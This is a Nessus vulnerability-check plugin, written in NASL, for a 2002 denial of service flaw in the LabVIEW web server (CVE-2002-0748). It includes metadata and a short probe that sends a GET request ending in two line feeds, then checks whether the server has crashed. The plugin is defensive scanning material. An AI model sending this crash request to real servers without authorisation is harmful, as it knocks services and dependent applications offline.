#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# From: "Steve Zins" <steve@iLabVIEW.com>
# To: bugtraq@securityfocus.com
# Subject: LabVIEW Web Server DoS Vulnerability
# Date: Mon, 22 Apr 2002 22:51:39 -0700
#


include("compat.inc");

if(description)
{
 script_id(11063);
 script_version ("$Revision: 1.26 $");

 script_cve_id("CVE-2002-0748");
 script_bugtraq_id(4577);
 script_osvdb_id(5119);

 script_name(english:"LabVIEW Web Server HTTP Get Newline DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending a request that ends
with two LF characters instead of the normal sequence CR LF CR LF (CR
= carriage return, LF = line feed). 

An attacker can exploit this vulnerability to make this server and all
LabView applications crash." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Apr/334" );
 script_set_attribute(attribute:"solution", value:
"Upgrade your LabView software or run the web server with logging
disabled." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:W/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/04/19");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Kills the LabView web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service1.nasl", "http_version.nasl");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

w = http_send_recv_buf(port: port, data: 'GET / HTTP/1.0\n\n');
sleep(1);

if (http_is_dead(port: port, retry: 3)) security_warning(port);
